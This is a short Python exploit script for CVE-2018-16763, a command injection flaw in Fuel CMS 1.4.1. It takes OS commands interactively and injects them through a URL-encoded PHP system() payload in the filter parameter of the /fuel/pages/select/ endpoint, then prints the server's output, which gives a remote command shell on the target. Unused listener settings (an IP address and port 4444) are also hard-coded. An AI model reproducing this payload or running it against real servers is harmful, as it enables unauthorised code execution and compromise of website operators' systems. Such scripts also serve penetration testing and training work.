#!/usr/bin/python3
import argparse
import requests
from sys import exit
from bs4 import BeautifulSoup
from socket import error

lhost = '10.6.58.106'
lport = 4444

def banner():
    banner = """
+-----------------------------------+
| [F]-[U]-[E]-[L] [C]-[M]-[S] 1.4.1 |
+-----------------------------------+
[+] CVE:                   2018-16763
[+] Discovery:             0xd0ff9
[+] Vulnerability:         Command Injection
[+] Vulnerable Version:    Fuel CMS 1.4.1
[+] Author:                https://github.com/SlizBinksman
-------------------------------------
[!] Note: SlizBinksman takes no credit
for the discovery of this vulnerability. 
This code has NO check function. The exploit
will not work if the target is not hosting
fuel cms version 1.4.1. The author IS NOT
RESPONSIBLE FOR YOUR ACTIONS.
-------------------------------------"""
    print(banner)
    return exploit()


def exploit():
    while True:
        try:
            payload = input("\n[+] OS Command: ")
            response = requests.get(f"{args.URL}/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('{payload}')%2B'")
            htmlText = BeautifulSoup(response.text,'html.parser')
            print(str(htmlText))

        except error:
            exit('\n[-] Could Not Connect To Server')

if __name__ == '__main__':

    mainArguments = argparse.ArgumentParser()
    mainArguments.add_argument('URL',help='Target Website Hosting Vulnerable CMS',type=str)
    args = mainArguments.parse_args()

    try:
        banner()
    except KeyboardInterrupt:
        exit('\n[!] Quitting')